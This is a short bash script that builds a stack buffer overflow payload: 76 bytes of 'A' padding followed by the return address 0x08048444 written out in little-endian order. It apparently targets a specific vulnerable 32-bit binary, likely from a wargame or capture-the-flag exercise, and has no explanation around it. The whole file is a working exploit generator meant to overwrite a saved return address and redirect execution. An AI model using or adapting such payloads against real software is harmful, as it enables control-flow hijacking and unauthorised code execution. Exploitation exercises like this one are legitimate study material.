#!/usr/bin/env bash

PADDING=A
PADDING_LEN=76

RETURN_ADDRESS='08048444'

printf "%.0s$PADDING" $(seq -s' ' "$PADDING_LEN")
<<< "$RETURN_ADDRESS" rev | dd conv=swab | xxd -r -p 
echo
